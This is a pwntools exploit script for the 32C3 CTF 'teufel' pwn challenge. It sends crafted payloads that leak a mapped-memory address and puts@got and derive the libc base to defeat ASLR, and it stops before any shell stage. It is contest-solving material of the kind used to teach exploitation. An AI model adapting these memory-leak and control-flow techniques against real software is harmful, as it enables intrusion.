# -*- coding: utf-8 -*-

# http://v0ids3curity.blogspot.kr/2015/12/32c3-ctf-pwn-200-teufel.html?m=0

from pwn import *

def hexify(x):
    return ":".join("{:02x}".format(ord(c)) for c in x)

b = ELF('teufel')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.arch = 'amd64'
context.log_level = 'info'

#r = remote('localhost', 8888)
r = process('./teufel')
#gdb.attach(r, '''
#b *0x40051f
#'''
#)
#raw_input('Go!')

# strace: 
#
# mmap(NULL, 12288, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0) = 0x7fe593523000
# mprotect(0x7fe593524000, 4096, PROT_READ|PROT_WRITE) = 0

if __name__ == "__main__":

    payload = ""
    payload += p64(9)
    payload += p64(0xcafebabedeadbeef) 
    payload += "A" # overwrite NULL (unless puts() would terminate before the stored rbp)

    r.send(payload)
    resp = r.recv()

# start() stores the address of mmapped region at rbp (in fact, plus 0x2000)
# sub_4004E6() pushes rbp into the stack
# so we can leak the address with puts()
#
# cafebabe deadbeef + 'A' + addr + '\n'
# ef:be:ad:de:be:ba:fe:ca: 41: a0:ad:0f:93:7f: 0a

# leak rbp

    mmap = resp[9:14]
    mmap = "\x00" + mmap + "\x00\x00" # replace 'A' with NULL
    mmap = u64(mmap)

    mmap -= 0x2000

    log.info('mapped memory: %#x' % mmap)


# Stage 2
#
# leak puts@got (and will kill the daemon)
# the binary kindly used fflush() (to ensure any buffered message printed before it dies)
# store puts@got+8 into rbp & jump to 0x40051f (+8 is to compensate for 'lea xxx,[rbp-8]')

    PUTS_GOT = b.got['puts']
    payload = ""
    payload += p64(24)
    payload += p64(0xcafebabedeadbeef)
    payload += p64(PUTS_GOT+8)
    payload += p64(0x40051F)

    r.send(payload)     
    resp = r.recv()
    print hexify(resp)

# cafebabe deadbeef + '\n' + puts@got + '\n'
# ef:be:ad:de:be:ba:fe:ca:e0:0f:60:0a:90:36:a3:e0:27:7f:0a

    puts_addr = resp[12:18]
    puts_addr += "\x00\x00"
    puts_addr = u64(puts_addr)
    LIBC_BASE = puts_addr - libc.symbols['puts']
    
    log.info('LIBC_BASE: %#x' % LIBC_BASE)

    log.info('mmaped - LIBC_BASE: %#x' % (mmap - LIBC_BASE))

# now we know the distance, 
# and the distance won't change (pretty deterministic)
# so, we can calc LIBC_BASE without worrying to kill the daemon.
#
# Refer to "On the effectiveness of Full-ASLR on 64-bit Linux" @ DeepSec
